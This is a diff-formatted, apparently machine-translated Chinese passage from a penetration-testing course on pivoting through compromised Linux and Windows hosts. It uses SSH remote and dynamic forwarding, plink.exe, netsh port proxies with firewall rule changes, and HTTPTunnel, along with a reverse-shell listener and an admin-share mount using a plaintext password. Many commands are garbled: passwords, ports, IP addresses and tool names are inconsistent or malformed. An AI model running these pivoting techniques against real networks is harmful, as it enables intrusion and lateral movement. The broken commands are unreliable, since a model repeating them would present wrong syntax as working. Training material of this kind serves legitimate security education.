+| ADMIN$ | Disk | 远程 Admin |
+| C$ | Disk | 默认共享 |
+| Data | Disk | |
+| IPC$ | IPC | 远程 IPC |
+| NETLOGON | Disk | 登录服务器 |
+| SYSVOL | Disk | 工作组登录服务器 |
+| Server | | | 注释 |
+| Workgroup | Master | 主机 |
+
+列表 636 - 通过本地端口转发在 Windows Server 2016 机器上的 Net 共享
+
+不仅命令执行成功，而且由于流量通过 SSH 隧道传输，整个事务都是加密的。我们可以使用此端口转发设置通过端口 445 继续分析目标服务器，或转发其他端口进行侦测。
+
+## 2.0.1 练习
+
+- 1. 连接到你的专用 Linux 并以 root 身份运行 `/root/port_forwarding_and_tunneling/clear_rules.sh`。
+- 2. 以 root 身份运行 `/root/port_forwarding_and_tunneling/ssh_local_port_forwarding.sh`。
+- 3. 注意 Linux 客户端和 Windows Server 2016 地址。
+- 4. 尝试复制上述 `smbclient` 枚举。
+
+## 2.2.2 远程端口转发
+
+SSH 中的远程端口转发可以被视为本地端口转发的反向：在远程端打开一个端口并将流量转发到我们的本地机器（启动 SSH 的客户端）。简而言之，指向远程主机指定端口的连接将转发到本地机器的指定端口。这可以通过新场景进行演示。
+
+在这种情况下，我们拥有内部网络 Linux 客户端的非 root shell。在在该被入侵的机器上，我们发现 MySQL 服务器运行在 TCP 3306 端口。与之前的场景不同，防火墙阻止了入站端口 22 (SSH)，因此我们无法从 Kali 机器进行 SSH。然而，由于出站端口 22 是允许的，我们可以从该服务器 SSH 到我们的 Kali。我们可以利用端口转发（调用 `-R`）在我们的 Kali 机器上打开一个端口，将流量转发到内部服务器的 MySQL 端口 (TCP 3306)。所有转发流量将通过隧道通过防火墙。只要绑定非特权端口 (1024)，就可以以非 root 用户运行 SSH。
+
+为了模拟这一场景，我们将在专用 Linux 客户端运行 `ssh_remote_forwarding.sh`：
+
+```
+
+root@debian:~# cat /root/port_forwarding_and_tunneling/ssh_remote_forwarding.sh
+
+#!/bin/bash
+
+# 清理 iptables
+
+iptables -P INPUT ACCEPT
+
+iptables -P FORWARD ACCEPT
+
+iptables -P OUTPUT ACCEPT
+
+iptables -F
+
+# SSH 场景
+
+iptables -P INPUT DROP
+
+iptables -P FORWARD DROP
+
+iptables -A INPUT -i lo -j ACCEPT
+
+iptables -A INPUT -m state ESTABLISHED,RELATED -j ACCEPT
+
+iptables -A INPUT -p tcp --dport 22 -m state NEW -j ACCEPT
+```
+
+
+
+```port_forwarding_and_tunneling/ssh_remote_forwarding.sh```
+
+# 使用 Kali Linux 2.0 进行渗透测试
+
+创建此隧道的命令语法将包括本地 IP 和端口、远程端口以及指定远程转发的 `-R`：
+
+```
+ssh -N -R [bind_address:]port username@address
+```
+
+列表 638 - 使用 SSH 进行远程端口转发的原型
+
+在这种情况下，我们将 Kali 机器作为用户（`kali@10.11.0.4`），指定无命令（`-N`）和远程转发（`-R`）。我们在 Kali 机器（`10.11.0.4:2221`）的 TCP 端口 `2221` 上打开监听器，并将连接转发到内部 Linux 机器的端口 `3306` (`127.0.0.1:3306`)。
+
+```
+student@~$ ssh -N -R 10.11.0.4:2221:127.0.0.1:3306 kali@10.11.0.4
+
+kali@10.11.0.4 password:
+```
+
+列表 639 - 将 TCP 端口 `2221` 远程转发到被入侵 Linux 机器上的 TCP 端口 `3306`
+
+这将 Kali 系统本地端口 `2221` 上的所有入流量通过 SSH 隧道 (`TCP 22`) 转发到被入侵机器的 `3306` 端口，允许我们访问 MySQL 端口，即使该端口在防火墙上被过滤了。
+
+我们的连接可以如图 299 所示：
+
+![](img/f99f528ca9845f4c256ce54e882b1345_604_0.png)
+
+图 299：远程端口转发图
+
+隧道建立后，我们可以切换到 Kali 机器，验证 TCP 端口 `2221` 正在监听，并扫描端口上的本地主机，这将识别目标 MySQL 服务的指纹：
+
+```
+kali@kali:~ ss -antp | grep "2221"
+
+LISTEN      0       128     127.0.0.1:2221      0.0.0.0:*      users:(("sshd",pid=2294,fd=9)
+
+LISTEN      0       128     [::]:2221          users:(("sshd",pid=2294,fd=8))
+```
+
+```
+kali@kali:~ sudo nmap -sS -sV 127.0.0.1 -p 2221
+```
+
+Nmap scan report for localhost (127.0.0.1)
+Host is up (0.00039s latency).
+
+| PORT | STATE | VERSION |
+|---|---|---|
+| 2221/tcp | open | mysql 5.5.15-10.26-MariaDB-0+deb9 |
+
+Nmap done: 1 IP (1 host) scanned in 0.56 seconds
+
+列表 640 - 通过隧道访问机器上的 MySQL 服务
+
+既然可以扫描端口，我们应该没有任何问题地使用任何 Kali 安装的工具跨隧道与 MySQL 服务进行交互。
+
+## 2.2.2 练习
+
+- 1. 通过 SSH 连接到你的专用实验环境并以 root 身份运行 `/root/port_forwarding_and_tunneling/clear_rules.sh`。
+- 2. 关闭到专用实验环境的所有 SSH 连接，然后使用桌面以 student 身份连接并运行 `/root/port_forwarding_and_tunneling/ssh_remote_forwarding.sh`。
+- 3. 尝试复制上述场景中的 SSH 远程端口转发，并你可以与 MySQL 服务交互。
+
+## 2.2.3 SSH 端口转发
+
+现在到了真正的部分。SSH 动态端口转发允许我们设置一个本地监听端口，并通过代理将流量隧道到任何远程目标。
+
+在场景中（类似于 SSH 本地端口转发部分使用的场景），我们入侵了基于 Linux 的目标并提升了权限。对被入侵的 Linux 客户端进行进一步枚举后，我们发现除了连接到当前网络 (`10.11.0.x`) 外，它还有一个网络接口似乎连接到了另一个网络 (`192.168.1.x`)。在这个内部子网上，我们发现了一台可用共享的 Windows Server 2016 机器。
+
+# 使用 Kali Linux 进行渗透测试 2.0
+
+为了在实验室环境中模拟这一场景，我们将再次从我们的 fuzzed Linux 客户端运行 `ssh_local_port_forwarding` 脚本。
+
+环境搭建完成后，我们可以使用 `ssh -D` 来指定本地动态 SOCKS4 应用端口转发（再次通过 SSH 隧道），语法如下：
+
+```
+ssh -N -D <address to bind to>:<port to bind> <username>@SSH server address
+```
+
+列表 641 - 通过 SSH 进行动态端口转发的命令行提示符
+
+考虑到上述语法，我们可以在 Kali Linux 机器上通过 TCP 端口 `8080` 创建一个本地 SOCKS4 应用代理 (`-N -D`)，该代理将所有流量通过被攻的 Linux 机器隧道到网络中的目标主机，我们以学生身份 `(`student@10.11.0.128`)` 登录该机器：
+
+```
+kali@~$ sudo ssh -N -D 127.0.0.1:8080 student@10.11.0.128
+
+student@10.11.0.128$ password:
+```
+
+列表 642 - 在 TCP 端口 `8080` 上到目标网络创建动态 SSH 隧道
+
+虽然我们已经启动了一个可以通过 SSH 隧道将应用流量路由到目标网络的代理，但我们必须以某种方式引导侦察和攻击工具使用该代理。在 `ProxyChains`⁵⁹³ 的帮助下，我们可以通过 HTTP、SOCKS4 和 SOCKS5 代理运行任何网络应用程序。
+
+要配置 Proxchains，我们只需编辑主配置文件 (`/etc/proxchains.conf`) 并我们的 SOCKS4 代理添加到：
+
+```
+kali@~$ cat /etc/proxchains.conf
+
+...
+
+[ProxyList]
+
+# add proxy here ...
+
+# meanwhile
+
+# defaults set to "tor"
+
+socks4 127.0.0.1 8080
+```
+
+列表 643 - 将我们的 SOCKS4 代理添加到 ProxyChains 配置文件
+
+该配置如图 340 所示：
+
+![](img/f99f528ca9845f4c256ce54e882b1345_606_0.png)
+
+> ⁵⁹³ (Adam Hamsik, 2017), https://github.com/haad/proxychains
+
+# 使用 Kali Linux 进行渗透测试 2.0
+
+# 攻击性安全
+
+![](img/f99f528ca9845f4c256ce54e882b1345_606_0.png)
+
+防火墙没有入站或出站过滤器。动态端口转发：`sudo ssh -D 127.0.0.1:8080 student@10.11.0.128`
+
+拥有 root 权限和暴露的服务后，我们可以在机器的 TCP 端口 `8080` 上设置 SOCKS 代理。我们通过目标主机 Linux 客户端 Attacker-Windows Server 2016 建立一个动态 SSH 隧道。图 300：动态端口转发图
+
+通过 SOCKS4 代理运行我们的工具，在每个命令前加上 `proxychains`。例如，让我们尝试使用 `nmap` 扫描内部网络上的 Windows Server 2016 机器。在本例中，除了参数外，我们没有对 `proxychains` 应用任何选项：
+
+```
+kali@kali: sudo proxychains nmap -sT -Pn 192.168.1.110
+```
+
+
+
+`192.168.1.110` 的 `nmap` 扫描报告
+
+# 主机已上线 (0.17s 延迟)。
+
+| PORT | STATE | SERVICE |
+| :--- | :--- | :--- |
+| 21/tcp | closed | ftp |
+| 22/tcp | closed | ssh |
+| 23/tcp | closed | telnet |
+| 25/tcp | closed | smtp |
+| 53/tcp | open | domain |
+| 80/tcp | closed | http |
+| 110/tcp | closed | pop3 |
+| 111/tcp | closed | rpcbind |
+| 135/tcp | open | ms-rpc |
+| 139/tcp | open | netbios |
+| 143/tcp | closed | imap |
+| 445/tcp | closed | https |
+| 443/tcp | open | microsoft-ds |
+| 993/tcp | open | imaps |
+| 995/tcp | closed | pop3 |
+| 1723/tcp | closed | pptp |
+| 3306/tcp | closed | mysql |
+| 3389/tcp | open | ms-wbt |
+| 5900/tcp | closed | vnc |
+| 8080/tcp | closed | http-proxy |
+
+`nmap` 完成：IP 地址 (主机) 扫描 3.54 秒
+
+列表 644 - 通过动态隧道使用 `nmap` 扫描机器
+
+在列表 644 中，`ProxyChains` 按预期工作，将我们的所有流量路由到各个端口，而无需提供单独转发。默认情况下，`ProxyChains` 将首先从当前目录读取，然后从 `/etc/proxychains.conf`。这允许我们根据需要通过多个隧道运行工具。
+
+## 20.2.3 练习
+
+- 连接到你的专用 Linux 客户端并运行 `/root/port_forwarding_and_tunneling/clear_rules.sh`。
+- 注意 Linux 客户端和 Windows Server 2016 IP 地址。
+- 在你的 Kali 机器上创建一个 `SOCKS4` 代理，通过 Linux。
+- 通过代理对 Windows Server 2016 机器执行成功的 `nmap` 扫描。
+- 通过隧道执行 `nmap` 扫描。这有效吗？结果准确吗？
+
+### 20.3 PLINK
+
+在此之前，所有的端口转发和隧道方法都是围绕 UNIX 系统的。现在让我们研究如何在 Windows 操作系统上执行端口转发和隧道。为了演示这一点，假设我们在评估期间获得了 Windows 10 机器的访问权限并获得了 SYSTEM 级反 shell。
+
+```
+kali@kali:~# sudo nc -lnvp 443
+
+listening on [any] ... connect to [10.11.0.4] from (UNKNOWN) [49953]
+
+Microsoft Windows [Version 10.0.16299, 389]
+
+(c) 2017 Microsoft Corporation. All rights reserved.
+```
+
+```
+C:\Windows\system32>
+```
+
+在枚举和信息收集过程中，我们发现 TCP 端口 `3306` 上运行着 MySQL 服务器。
+
+```
+C:\Windows\system32>netstat -anbp TCP
+```
+
+活动连接
+
+| Proto | Local Address | Foreign Address | State |
+| :--- | :--- | :--- | :--- |
+| TCP | 0.0.0.0:80 | 0.0.0.0 | LISTENING | sync.exe |
+| TCP | 0.0.0.0:135 | 0.0.0.0 | LISTENING | Rpcss |
+| TCP | 0.0.0.0:445 | 0.0.0.0 | LISTENING | svchost.exe |
+| TCP | 0.0.0.0:3306 | 0.0.0.0 | LISTENING | mysql.exe |
+
+我们想要查询此数据库或与服务交互。然而，由于防火墙的存在，我们无法从 Kali 机器直接与此服务交互。
+
+我们将 `plink.exe`⁵94（Windows 命令行 SSH 客户端，PuTTY 项目的一部分）传输到目标机器以克服这一限制。提示符语法与基于 UNIX 的 `ssh` 客户端类似：
+
+```
+C:\Tools\port_redirect_and_tunneling>plink.exe
+
+plink.exe
+
+plink: command-line connection utility
+
+Release 0.70
+
+Usage: plink [options] [user]@host [command]
+
+"host"也可以是 PuTTY 保存会话名
+```
+
+> ⁵94 (Simon Tathan, 2002), http://the.earth.il/~sgathan/putty/doc/Chapter7.html
+
+选项：
+- `v` 输出版本信息并退出
+- `pgf` 输出 PGP 密钥指纹并退出
+- `v` 显示详细消息
+- `load sessname` 从保存会话加载设置
+- `ssh telnet -login -raw -n` 强制执行远程协议
+- `P port` 连接到指定端口
+- `l user` 使用指定的用户名连接
+- `batch` 禁用所有交互式提示
+- `proxycmd command` 使用 'command' 作为本地代理
+
+以下选项仅适用于 SSH 连接：
+- `pw pass [listen-IP]:listen-port` 使用指定的密码
+- `-D` 动态基于 SOCKS 的端口转发
+- `-L [listen-IP]:listen-port` 将本地端口转发到远程地址
+- `-R [listen-IP]:listen-port:port` 将远程端口转发到本地地址
+- `-X x` 启用/禁用 X11 转发
+- `-A a` 启用/禁用代理转发
+- `-t -T` 启用/禁用 pty 分配
+
+列表 647 - `plink.exe` 帮助菜单
+
+我们使用 `plink.exe` 通过 SSH(`--ssh`) 连接到我们的 Kali 机器 (`10.11.0.4`)，使用 `kali` 用户 (`-l kali`) 和密码 "`leak`" (`-pw ilak`) 创建远程端口转发 (`-R`)，将端口 `1234` `10.11.0.4:1234` 转发到 Windows 目标上的 MySQL 端口 (`127.0.0.1:3306`)，命令如下：
+
+```
+C:\Tools\port_redirection_and_tunneling\ plink.exe -ssh -l kali -pw ilak -R 10.11.0.4:1234:127.0.0.1:3306 10.11.0.4
+```
+
+列表 648 - 在未知主机上尝试设置远程端口转发
+
+在第一次连接到主机时，它将尝试将主机密钥缓存到注册表中。如果我们通过 `rdesktop` 连接到 Windows 客户端运行该命令，就可以看到这个交互步骤。
+
+# 使用 Kali Linux 进行渗透测试 2.0
+
+![](img/f99f528ca9845f4c256ce54e882b1345_611_0.png)
+
+```
+Command Prompt - plink -ssh -i key -pw -ssh -L 10.11.0.4:1234:127.0.0.1:3306 10.11.0.4
+
+C:\tools\port_redirection_and_tunneling\plink.exe -ssh -L 10.11.0.4:1234:127.0.0.1:3306 10.11.0.4
+
+The server's host key is not cached in the registry.
+
+Do you want to continue connecting (yes/no)?
+
+y> yes
+
+The server's rsa key fingerprint is:
+
+sha256:7aa88:cf:ed:92:06:43:9c:af7b:9c:d3:25:30:25:91:56
+
+If you trust this host, type "yes" to add it to the list of known hosts and cache it.
+
+If you want to save and connect at once, without editing the file
+
+If you do not trust this host, press Return to abandon the connection
+
+Store key in cache? (y/n)
+```
+
+
+
+图 301：PLINK 在处理未知主机时所需的交互
+
+然而，由于这在典型反向 shell 的交互级别下可能不起作用，我们应该使用 `cmd.exe /c echo y` 将答案管道传递到提示符。从我们的反向 shell 中，此命令将在没有任何交互的情况下成功建立远程端口转发：
+
+```
+C:\tools\port_redirection_and_tunneling\cmd.exe /c echo y | plink.exe -ssh -l kali -pw wilak -R 10.11.0.4:1234:127.0.0.1:3306
+```
+
+```
+cmd.exe /c echo y | plink.exe -ssh -l root -pw -T R 10.11.0.4:1234:127.0.0.1:3306 10.11.4
+```
+
+Kali GNU/Linux 系统包含的程序是免费软件；每个程序的分发条款在 `/usr/share/doc/copyright` 中的单独文件中有描述。
+
+Kali GNU/Linux 在适用法律允许的范围内**不提供任何保证**。
+`kali@kali:-`
+
+现在我们已经建立了隧道，可以尝试通过我们在 Kali 攻击机上 TCP 端口 1234 的本地端口转发，对目标的 MySQL 启动 Nmap 扫描：
+
+```
+kali@kali:$ sudo nmap -sS -sV 127.0.0.1 -p 1234
+Starting Nmap 7.60 (https://nmap.org ) at 2019-09-24 20:05:20 EEST
+Nmap scan report for localhost (127.0.0.1)
+Host is up (0.00026s).
+```
+
+```
+PORT STATE SERVICE VERSION
+1234/tcp open MySQL 5.5.55-10.1.3-MariaDB
+```
+
+Nmap: 1 个 IP 地址（1 个主机在线）通过隧道扫描了 MySQL 服务
+
+列表 659 - 使用 plink 启动一个无需交互的远程隧道
+
+# 攻击性安全
+www.offensive-security.com
+
+设置似乎运行正常。我们已经成功通过 Kali 攻击机上的远程端口转发，扫描了 Windows 10 机器的 SQL 服务。
+
+## 20.3.1.1 练习
+
+- 通过 Sync Breeze 漏洞在你的 Windows 实验室客户端获取反向 shell。
+- 使用 `plink.exe` 建立到 Windows 10 客户端上 MySQL 服务的远程端口转发。
+- 通过远程端口转发扫描 MySQL 端口。
+
+### 20.4 NETSH
+
+在本节中，我们将考虑以下场景：
+
+在评估期间，我们攻破了一个 Windows 10 目标，并成功地将权限提升到 SYSTEM。在对被攻破机器进行枚举后，我们发现除了连接到当前网络 (`10.11.0.x`) 外，它还有一个额外的网络接口，该接口似乎连接到了不同的网络 (`192.168.1.x`)。我们识别出一个 Windows Server 2016 机器 (`192.168.1.110`)，其 TCP 端口 `445` 是开放的。
+
+为了继续该场景，我们现在可以从 SYSTEM 级别寻找在受害者网络内部跳转的方法，在这一级别我们不需要处理用户账户控制 (`UAC`)，这意味着我们可以使用 `netsh` 工具（每个现代 Windows 版本都默认安装）进行端口转发和跳板。
+
+然而，对于这项工作，Windows 系统运行着 Helper 服务，并且必须为我们要使用的接口启用 IPv6 支持。坦率地说，这两者在 Windows 系统上默认都是开启并启用的。
+
+我们通过 Windows 服务检查 IP 服务是否正在运行以确认这一点：
+
+| 服务 (本地) | 名称 | 描述 | 状态 | 启动类型 | 登录 |
+|---|---|---|---|---|---|
+| IP Helper | IP Helper | 提供隧道连接性 | 正在运行 | 手动 (触发) | 网络服务 |
+| IP6 Agent | IP6 Agent | 提供隧道安全 (IPv6) | 正在运行 | 手动 (触发) | 网络服务 |
+| Link-Layer Topology Discovery | Link-Layer Topology Discovery | 创建网络... | 手动 | 本地服务 |
+| Local Session Manager | Local Session Manager | 运行的核心服务... | 正在运行 | 自动 | 本地 |
+| Remote Registry | Remote Registry | 分发注册表设置 | 手动 | 本地 |
+| Microsoft Account Sign-in | Microsoft Account Sign-in | 通过...登录 | 手动 (触发) | 本地 |
+
+图 302：IP Helper 正在运行
+
+我们在网络接口设置中确认 IPv6 支持：
+https://docs.microsoft.com/en-us/windows-server/technologies/netsh-contexts
+
+# 使用 Kali Linux 进行渗透测试 2.0
+攻击性安全
+- QoS Packet Scheduler
+- Link-Layer Topology Responder (TCP/IPv4)
+- Internet Protocol Version 4 (TCP/IPv4)
+- Link-Layer Topology Mapper
+- Microsoft Network Adapter Multiplexer
+- Microsoft LLDP Driver
+- Internet Protocol Version 6 (TCP/IPv6)
+
+图 303：IPv6 已启用
+
+与 SSH 端口转发示例不同，我们将尝试将发往端口 `445` 的流量重定向从被攻破的 Windows 10 机器转发到端口 `445` 的 Windows Server 2016 机器 (`192.168.1.110`)。在本示例中，我们将使用 `netsh` 接口上下文添加一个在 `10.11.0.22` 上监听的 IPv4 代理：
+
+```
+C:\Windows\System32> netsh interface proxy add v4 listenport=455 listenaddresses=10.11.0.22 connectaddress=192.168.1.110
+```
+
+列表 651 - 使用 netsh 进行端口转发
+
+使用 `netstat` 可以确认端口 `455` 正在被攻破的 Windows 监听：
+
+```
+C:\Windows\System32> netstat -an | find "455"
+TCP    10.11.0.22:455           0.0.0.0               LISTENING
+```
+
+列表 652 - 使用 netsh 后检查端口是否绑定
+
+默认情况下，Windows 防墙会阻止端口 `455` 的入站连接，这将阻止我们与隧道交互。由于我们是以 SYSTEM 权限运行的，可以通过添加允许入站连接的防火墙规则来轻松启用此。这些 `netsh` 选项自言易懂，但我们要利用 `netsh` 的防火墙上下文。
+
+```
+C:\Windows\System32> netsh advfirewall add rule name="forward_port_rule" protocol=tcp dir=in localport=10.11.0.22 remoteport=455 action=allow
+Ok.
+```
+
+列表 653 - 使用 netsh 允许端口 455 的入站流量
+
+最后一步，我们可以尝试使用 `smbclient` 连接到端口 `455` 机器。如果一切顺利，流量将被重定向到内部 Windows Server 2016 机器上的可用共享。与我们之前的场景一样，Samba 需要配置最小 SMB 版本。虽然这是多余的，但为了完整性，我们将包含这些命令：
+
+```
+kali@kali~$ sudo nano /etc/samba/smb.conf
+kali@kali~$ cat /etc/samba/smb.conf
+```
+
+请注意，你还需要为这些用户设置适当的 Unix 权限，使其具有写入权限：
+; write list = root, lpadmin
+min protocol = SMB2
+
+```
+kali@kali:-$ sudo /etc/init.d/smbd restart
+[ ] Restarting smbd. service (via systemctl): smbd.service.
+```
+
+```
+kali@kali:-$ smbclient -l 10.11.0.22 --port=445 -user=Administrator
+Unable to initialize messaging context
+Enter WORKGROUP\Administrator's password:
+```
+
+
+
+| 共享名称 | 类型 | 注释 |
+|---|---|---|
+| ADMIN$ | Disk | 远程管理 |
+| C$ | Disk | 默认共享 |
+| Data | IPC | 远程 IPC |
+| NETLOGON | | 登录服务器 |
+| DISK | | 登录服务器 |
+
+重新连接 SMB1 以列出组
+`do_connect`: Connection to `10.11.0.22` failed (Error `HT_STATUS_TO_TIMEOUT`)
+使用 SMB1 连接失败 - 无可用组
+
+列表 654 - 使用 `NETSH` 通过本地端口转发列出 Windows Server 2016 机器上的网络
+
+我们成功列出了共享，但 `smbclient` 生成了错误。此超时问题是由端口转发错误引起的，让我们测试并确定我们是否可以与共享交互。
+
+```bash
+kali@kali:-$ sudo mkdir /mnt/win10_share
+```
+
+```bash
+kali@kali:-$ sudo mount -t cifs -o port=445 //10.11.0.22/Data -o username=Administrator,password=Qwerty09! /mnt/win10_share
+```
+
+```bash
+kali@kali:-$ ls -l /mnt/win10_share/
+```
+
+```
+total 1
+
+-rw-r--r-- 1 root root 7 Apr 17 2019 data.txt
+```
+
+```bash
+kali@kali:-$ cat /mnt/win10_share/data.txt
+```
+
+```
+data
+```
+
+列表 655 - 通过本地端口转发挂载 Windows Server 2016 机器上的远程共享
+
+如上述命令所示，此错误阻止了我们列出组，但不影响我们挂载共享的能力。端口转发成功了。
+
+## 20.4.1.1 练习
+
+- 1. 通过 Sync Breeze 漏洞在你的 Windows 客户端获取反向 shell。
+- 2. 使用 SYSTEM shell，利用 `netsh` 利用端口转发示例。
+
+## 20.5 HTTP隧道穿透深度包检测
+
+到目前为止，我们已经遍历了基于端口过滤和状态检测的防火墙。然而，某些深度包检测（DPI）设备可能只允许特定的协议。例如，如果不允许 SSH 协议，那么依赖该协议的隧道将会失败。
+
+为了演示这一点，我们将考虑一个类似的场景。在我们的 NIX 场景中，假设我们已经通过漏洞破解了一台 Linux 服务器，并将权限提升到 root，并获取了机器上 root 用户和 student 用户的密码。
+
+尽管我们被破解的 Linux 服务器实际上没有实现深度包检测，但出于该场景的考虑，我们假设已经实现了一个仅允许 HTTP 协议的深度包检测功能。与之前的场景不同，基于 SSH 的隧道在这里将无法工作。
+
+此外，此场景中的防火墙仅允许 80、443 和 1234 端口的入站和出站。允许 80 和 443 端口是因为这台机器是一台 Web 服务器，1234 显然是一个疏忽，因为它目前没有映射到内部网络中的任何监听端口。
+
+为了模拟这一场景，我们将在专用的 Linux 客户端运行 `httptunneling.sh` 脚本：
+
+```bash
+root@debian:~# cat /root/port_forwarding_and_tunneling/http_tunneling.sh
+```
+
+```bash
+#!/bin/bash
+
+# Clear iptables rules
+
+iptables -P INPUT ACCEPT
+
+iptables -P FORWARD ACCEPT
+
+iptables -P OUTPUT ACCEPT
+
+iptables -F
+
+iptables -X
+
+# SSH Scenario
+
+iptables -F
+
+iptables -P INPUT DROP
+
+iptables -P FORWARD DROP
+
+iptables -A INPUT -i lo -j ACCEPT
+
+iptables -A INPUT -p tcp -m state --ESTABLISHED,RELATED -j ACCEPT
+
+iptables -A INPUT -p tcp -m state --state NEW -j ACCEPT
+
+iptables -A INPUT -p tcp --dport 443 -m state --state NEW -j ACCEPT
+
+iptables -A INPUT -p tcp --dport 1234 -m state --state NEW -j ACCEPT
+
+iptables -A INPUT -i lo -j ACCEPT
+```
+
+```bash
+root@debian:~# /root/port_forwarding_and_tunneling/http_tunneling.sh
+```
+
+在这种情况下，我们的目标是仅使用 HTTP 协议，从 Kali Linux 机器通过被破解的 Linux 服务器向 Windows Server 2016 发起远程桌面连接。
+
+## 攻击性 (OFFENSIVE SECURITY)
+
+我们将依靠 HTTPTunnel 将流量封装在 HTTP 请求中，创建一个“HTTP 隧道”。HTTPTunnel 使用客户端/服务器模型，我们需要安装该工具，然后运行客户端和服务器。
+
+> `stunnel` 工具与 HTTPTunnel 类似，可以以类似的方式使用。它是一个多平台的 GNU/GPL 许可代理程序，可以使用 SSL/TLS 加密任意 TCP 连接。
+
+我们可以如下所示从 Kali Linux 存储库安装 HTTPTunnel：
+
+```bash
+kali@kali:~$ apt-search httptunnel
+```
+
+```
+httptunnel - Tunnels a data stream in HTTP requests
+```
+
+```bash
+kali@kali:~$ sudo install httptunnel
+```
+
+
+
+### 列表 65 - 从 Kali Linux 存储库安装 HTTPTunnel
+
+在深入之前，我们将描述我们正尝试实现的流程。
+
+首先，记住我们在内部 Linux 服务器上有一个 shell。该 shell 是基于 HTTP 的（这是防火墙允许的唯一协议），我们通过 TCP 端口 `443`（受漏洞服务器端口）与其连接。
+
+我们在这台机器上创建一个到 `8888` 端口的本地转发，这将所有连接转发到 Windows Server 的 `3389` 端口（远程桌面端口）。注意，此端口不受 HTTP 协议限制，因为两台机器在同一网络中，且流量不经过深度包检测服务。然而，当我们尝试从 Linux 服务器连接隧道到我们基于互联网的 Kali Linux 机器时，协议限制将产生问题。这就是我们基于 SSH 的隧道由于协议不允许而被拦截的地方。
+
+为了解决这个问题，我们使用 `HTTPTunnel` 在机器之间创建一个 HTTP 隧道（一种允许的协议）。此 `HTTPTunnel` 的“输入”位于我们的 Kali Linux 机器上（本地端口 `8080`），隧道将“输出”到监听在 `1234` 端口的被破解的 Linux 上（防火墙）。HTTP 请求将被解封装，流量将交给我们基于 SSH 的本地转发，重定向到我们 Windows 目标的远程桌面端口。
+
+设置完成后，我们将向 Kali Linux 机器的本地端口 `8080` 启动远程桌面会话。请求将被 HTTP 封装，通过 `HTTPTunnel` 作为 HTTP 流量发送到 Linux 服务器的 `1234` 端口（解封装），最后发送到我们 Windows 目标的远程桌面端口。
+
+⁹96 (Sebastian Weber, 2010), http://http.tunnel.seforge.net/
+⁹97 (Stunnel, 2019), https://www.org/
+⁹98 (Sebastian Weber, 2010), http://http.tunnel.seforge.net/
+
+## 使用 Kali Linux 2.0 进行渗透测试
+
+## 攻击性 (OFFENSIVE SECURITY)
+www.offensive-security.com
+
+在继续之前，花点时间理解这个诚然复杂的流量流。带有封装的端口转发可能是复杂的，因为我们必须考虑防火墙规则、协议限制以及入站和出站端口分配。在执行实际命令之前，暂停并绘制一张如图 304 所示的地图或流程图通常会有帮助。如果不尝试同时理清逻辑和语法，这个过程将变得非常复杂。
+
+图 304：HTTP 封装
+- 攻击者 (Kali)
+- Linux 客户端
+- Windows Server 2016
+- 防火墙仅允许 `80` 端口的 HTTP 协议，此外错误配置允许 `1234` 端口的 TCP 流量
+- 我们从客户端的 `8888` 端口创建到 Windows Server 2016 `3389` 端口的本地转发
+- 我们在 Linux 客户端上设置 `HTTPTunnel` 服务器
+- 我们启动 `HTTPTunnel` 客户端连接服务器
+- 为了启动隧道，我们被破解的 Linux 机器和 Windows 远程桌面之间创建一个基于 SSH 的端口转发。注意，在这里协议很重要（使用了 SSH），因为流量不受深度包检测的影响。为了做到这一点，我们将从这台机器 (`127.0.0.1`) 创建本地转发并使用渗透后的新密码登录。我们将 `8888` 端口上的所有请求转发到 Windows 远程端口 (`192.168.110:3389`)。
+
+```bash
+student@debian=$ ssh -L 0.0.0.0:8888:192.168.110:3389 student@127.0.1
+无法创建目录 '/root/.ssh/'。127.0.0.1 的真实性无法建立。
+ECDSA 指纹为 SHA256:RdJnWlcEGy+CnShII6oyAB3JD。
+确定要继续连接吗 (yes/no)? yes
+无法将主机添加到已知主机列表 (/root/.ssh/known_hosts)。
+127.0.0.1 的密码：
+student@debian:~# ss -antp | grep "8888"
+```
+
+2.0
+Copyright © Offensive Security Ltd. 保留所有权利。
+
+## 攻击性 (OFFENSIVE SECURITY)
+
+`ss -antp | grep "8888"`
+`LISTEN 0 1`
+
+### 列表 58 - 通过被破解的 Linux 机器转发 端口到 Windows Server 2016 的 端口
+
+下一步，我们必须为 Kali Linux 机器创建一个 `HTTPTunnel` 以剥离仅 HTTP 的协议限制。如上所述，`HTTPTunnel` 同时使用客户端 (`hts`) 和服务器 (`sts`)。我们将设置服务器 (`sts`)，它将监听本地端口 `1234`，解封装来自入站 HTTP 流的流量并将其重定向到本地端口 `8888`，并将之前的连接重定向到 Windows 目标的远程桌面。
+
+```bash
+student@debian:~# hts --forward-port localhost 8888 1234
+hts --forward-port localhost 8888
+student@debian:~# ps aux | grep hts
+student 12080 0.0 0.0 2420 68 ? Ss 07:04 0:00 --forward-port localhost 8888 1234
+student 12084 0.0 0.0 4728 S+ 07:49 0:00 grep hts
+```
+
+```bash
+student@debian:~# ss -antp | grep "1234"
+ss -antp | grep "1234"
+LISTEN 0 1 *:1234 *: users:("hts",pid=12080,fd=4))
+```
+
+### 列表 59 - 设置 HTTPTunnel 服务器
+
+`ps` 和 `ss` 命令显示 `HTTPTunnel` 服务器已启动并运行。
+
+接下来，我们需要一个 `HTTPTunnel` 客户端调用我们的远程桌面流量，将其封装为 HTTP 流并发送到 `HTTPTunnel` 服务器。此 (`hts`) 命令将监听本地端口 `8080` (`--forward-port 8080`)。封装流量并跨越防火墙转发到我们监听在 `1234` 端口的 `HTTPTunnel` 服务器 (`10.11.0.128:1234`)。
+
+```bash
+kali@kali:~# hts --forward-port 8080 10.11.0.128:1234
+kali@kali:~# ps aux | grep htc
+kali 10051 0.0 0.0 6536 92 ? Ss 03:33 0:00 htc --forward-port 8080 10.11.0.128:1234
+kali 10053 0.0 0.0 12980 1856 pts/0 S+ 03:33 0:00 grep htc
+```
+
+```bash
+kali@kali:~# ss -antp | grep "8080"
+LISTEN 0 0 0.0.0.0:0.0.0.0:*: users:("htc",pid=2692,fd=4))
+```
+
+### 列表 60 - 设置 HTTPTunnel 客户端组件
+
+再次，`ps` 和 `ss` 命令显示 `HTTPTunnel` 已启动并运行。
+
+现在，所有到我们 Kali Linux 机器 TCP 端口 `8080` 的流量都将重定向到我们的 `HTTPTunnel` 中（其中它被 HTTP 封装，跨越防火墙发送到被破解的 Linux 服务器并解封装），然后再次重定向到 Windows Server 的远程桌面服务。
+
+## 使用 Kali Linux 进行渗透测试 2.0
+
+我们可以通过启动 `Wireshark` 嗅探流量来验证此操作是否有效，并在 HTTP 封装之前，向我们 Kali Linux 机器的 `8080` 端口发起远程桌面连接：
